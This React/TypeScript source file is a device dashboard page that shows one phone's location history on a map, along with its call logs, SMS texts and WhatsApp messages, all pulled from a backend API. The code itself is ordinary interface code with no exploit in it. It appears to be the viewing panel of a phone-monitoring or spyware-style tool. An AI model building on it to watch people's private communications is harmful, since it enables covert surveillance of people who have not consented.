import { useEffect, useState } from 'react'
import { useParams, useNavigate } from 'react-router-dom'
import { MapContainer, TileLayer, Marker, Popup, Polyline } from 'react-leaflet'
import {
  getLocations, getCallLogs, getSmsLogs, getWhatsApp,
  LocationDto, CallLogDto, SmsDto, WhatsAppDto
} from '../api/api'

type Tab = 'map' | 'calls' | 'sms' | 'whatsapp'

const callType = (t: number) => t === 1 ? '📲 Incoming' : t === 2 ? '📤 Outgoing' : '❌ Missed'
const smsType  = (t: number) => t === 1 ? '📩 Inbox' : '📤 Sent'
const fmt      = (ms: number) => new Date(ms).toLocaleString()

const s: Record<string, React.CSSProperties> = {
  page:   { minHeight: '100vh', padding: 24 },
  back:   { cursor: 'pointer', color: '#4f46e5', fontWeight: 600, marginBottom: 16, display: 'inline-block' },
  tabs:   { display: 'flex', gap: 8, marginBottom: 20 },
  tab:    { padding: '8px 20px', borderRadius: 8, border: '1px solid #ddd', cursor: 'pointer', fontWeight: 600, background: '#fff' },
  active: { background: '#4f46e5', color: '#fff', border: '1px solid #4f46e5' },
  table:  { width: '100%', borderCollapse: 'collapse', background: '#fff', borderRadius: 12, overflow: 'hidden', boxShadow: '0 2px 12px rgba(0,0,0,.07)' },
  th:     { padding: '10px 14px', background: '#f8f9fa', textAlign: 'left', fontSize: 13, fontWeight: 700, borderBottom: '1px solid #eee' },
  td:     { padding: '10px 14px', fontSize: 13, borderBottom: '1px solid #f0f0f0', verticalAlign: 'top' }
}

export default function DevicePage() {
  const { id }    = useParams<{ id: string }>()
  const nav       = useNavigate()
  const deviceId  = Number(id)

  const [tab,      setTab]      = useState<Tab>('map')
  const [locations, setLocations] = useState<LocationDto[]>([])
  const [calls,    setCalls]    = useState<CallLogDto[]>([])
  const [sms,      setSms]      = useState<SmsDto[]>([])
  const [whatsapp, setWhatsapp] = useState<WhatsAppDto[]>([])

  useEffect(() => {
    getLocations(deviceId).then(r => setLocations(r.data)).catch(() => {})
    getCallLogs(deviceId).then(r => setCalls(r.data)).catch(() => {})
    getSmsLogs(deviceId).then(r => setSms(r.data)).catch(() => {})
    getWhatsApp(deviceId).then(r => setWhatsapp(r.data)).catch(() => {})
  }, [deviceId])

  const latest = locations[0]
  const path: [number, number][] = locations.map(l => [l.latitude, l.longitude])

  return (
    <div style={s.page}>
      <span style={s.back} onClick={() => nav('/')}>← Back to Devices</span>
      <h2 style={{ marginBottom: 16 }}>Device #{deviceId}</h2>

      <div style={s.tabs}>
        {(['map', 'calls', 'sms', 'whatsapp'] as Tab[]).map(t => (
          <button key={t} style={{ ...s.tab, ...(tab === t ? s.active : {}) }} onClick={() => setTab(t)}>
            {t === 'map' ? '🗺 Location' : t === 'calls' ? '📞 Calls' : t === 'sms' ? '💬 SMS' : '🟢 WhatsApp'}
          </button>
        ))}
      </div>

      {/* ─── MAP ─────────────────────────────────────────────────── */}
      {tab === 'map' && (
        <MapContainer
          center={latest ? [latest.latitude, latest.longitude] : [39.9, 32.8]}
          zoom={latest ? 14 : 6}
          style={{ height: 500, borderRadius: 12 }}
        >
          <TileLayer url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png" />
          {latest && (
            <Marker position={[latest.latitude, latest.longitude]}>
              <Popup>Last seen: {fmt(latest.timestamp)}</Popup>
            </Marker>
          )}
          {path.length > 1 && <Polyline positions={path} color="#4f46e5" weight={3} opacity={0.7} />}
        </MapContainer>
      )}

      {/* ─── CALLS ───────────────────────────────────────────────── */}
      {tab === 'calls' && (
        <table style={s.table}>
          <thead>
            <tr><th style={s.th}>Contact</th><th style={s.th}>Number</th><th style={s.th}>Type</th><th style={s.th}>Duration</th><th style={s.th}>Date</th></tr>
          </thead>
          <tbody>
            {calls.map((c, i) => (
              <tr key={i}>
                <td style={s.td}>{c.name || '—'}</td>
                <td style={s.td}>{c.number}</td>
                <td style={s.td}>{callType(c.type)}</td>
                <td style={s.td}>{c.duration}s</td>
                <td style={s.td}>{fmt(c.date)}</td>
              </tr>
            ))}
          </tbody>
        </table>
      )}

      {/* ─── SMS ─────────────────────────────────────────────────── */}
      {tab === 'sms' && (
        <table style={s.table}>
          <thead>
            <tr><th style={s.th}>From/To</th><th style={s.th}>Message</th><th style={s.th}>Type</th><th style={s.th}>Date</th></tr>
          </thead>
          <tbody>
            {sms.map((m, i) => (
              <tr key={i}>
                <td style={s.td}>{m.address}</td>
                <td style={s.td}>{m.body}</td>
                <td style={s.td}>{smsType(m.type)}</td>
                <td style={s.td}>{fmt(m.date)}</td>
              </tr>
            ))}
          </tbody>
        </table>
      )}

      {/* ─── WHATSAPP ─────────────────────────────────────────────── */}
      {tab === 'whatsapp' && (
        <table style={s.table}>
          <thead>
            <tr><th style={s.th}>Sender</th><th style={s.th}>Message</th><th style={s.th}>Time</th></tr>
          </thead>
          <tbody>
            {whatsapp.map((w, i) => (
              <tr key={i}>
                <td style={s.td}>{w.sender}</td>
                <td style={s.td}>{w.message}</td>
                <td style={s.td}>{fmt(w.timestamp)}</td>
              </tr>
            ))}
          </tbody>
        </table>
      )}
    </div>
  )
}
